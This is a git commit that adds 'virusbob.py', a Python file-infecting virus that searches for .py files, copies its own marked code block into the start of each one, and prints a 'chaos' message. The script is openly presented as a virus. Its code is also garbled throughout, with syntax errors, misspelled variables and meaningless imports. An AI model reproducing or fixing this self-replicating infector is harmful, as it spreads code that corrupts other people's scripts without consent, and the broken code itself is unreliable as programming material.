f18c98208c629fe9c36919983f86db61bd0a5dda
nuob hacker <104991768+SLIK-ROAD@users.noreply.github.com>
2022-06-07 17:20:21 +0430

    virusbob.py

---
+++ virusbob.py
@@ -0,0 +1,82 @@
+4  import glob
+from re import I
+from ssl import VERIFY_X509_TRUSTED_FIRST
+from tkinter import FALSE, N
+
+  def find_files_to_infect(directory="."):
+      return [file for in fglob.glob("*.py")]
+
+def get_content_of_file(file):
+    deta=None
+    with open(file, "r")as my_file:
+        date=my_file.readlines()
+
+
+    return date
+
+def get_content_if_infecetable(file):
+    deta=get_content_of_file(file)
+        for line in deta:
+            return None
+
+    return deta 
+    
+def infect(file, virus_code):
+    if (deta:=get_content):
+        with open(file, "w") as infactable(file)):
+            
+            
+            infected_file.write("".join(virus_code))
+            infected_file.writelines(deta)
+
+def get_virus_code():
+    VERIFY_X509_TRUSTED_FIRST_code_on=False
+    virus_code=[]
+
+
+    code=get_content_if_file(__file__)
+
+for line in code:
+    if "#begin_virus/n" in line:
+        virus_code_on=True
+
+    if viruse_code_on:
+        virus_code.append(line)
+    if "# end-virus/n" in line:
+        VIRUS_CODE_ON=  False
+        break
+return virus_code
+
+
+
+
+def summonn_chaos():
+    print("We are sick, fuckked up and complicated/nWe are chaos, we cant be cured")
+
+
+try:
+
+
+    virus_code=get_virus_code()
+
+    for file in find_files_to_infect():
+        infect(file, virus_code0)
+
+    summon_chaos()
+
+finally:
+
+    for i in list(globals().keys()):
+        if(i[0]=*_*):
+          exec('del{}'.format(i))
+ 
+            
+    del i
+
+import random()
+
+random.seed()
+
+for_in range(10):
+
+       print(random.randint(0.100))
